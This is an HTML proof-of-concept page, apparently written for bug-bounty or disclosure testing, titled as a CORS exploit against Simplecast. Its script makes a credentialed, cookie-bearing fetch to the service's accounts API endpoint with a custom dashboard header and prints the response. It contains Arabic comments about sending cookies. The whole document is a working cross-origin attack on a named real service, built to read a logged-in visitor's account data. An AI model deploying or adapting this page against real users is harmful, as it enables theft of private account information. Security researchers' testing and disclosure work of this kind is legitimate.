<!DOCTYPE html>
<html>
<head>
    <title>Simplecast CORS Exploit PoC</title>
</head>
<body>
<h2>Running CORS Exploit...</h2>
<pre id="output">Waiting for response...</pre>

<script>
(async () => {
    try {
        const res = await fetch("https://cms-api-gateway.simplecast.com/accounts", {
            method: "GET",
            credentials: "include", // لإرسال الكوكيز
            headers: {
                "X-Simplecast-App": "dashboard"
            }
        });
        
        if (!res.ok) {
            document.getElementById("output").textContent = `Request failed: ${res.status}`;
            return;
        }
        
        const data = await res.text(); // لو JSON تقدر تستخدم res.json()
        document.getElementById("output").textContent = data;
    } catch (err) {
        document.getElementById("output").textContent = "Error: " + err;
    }
})();
</script>
</body>
</html>
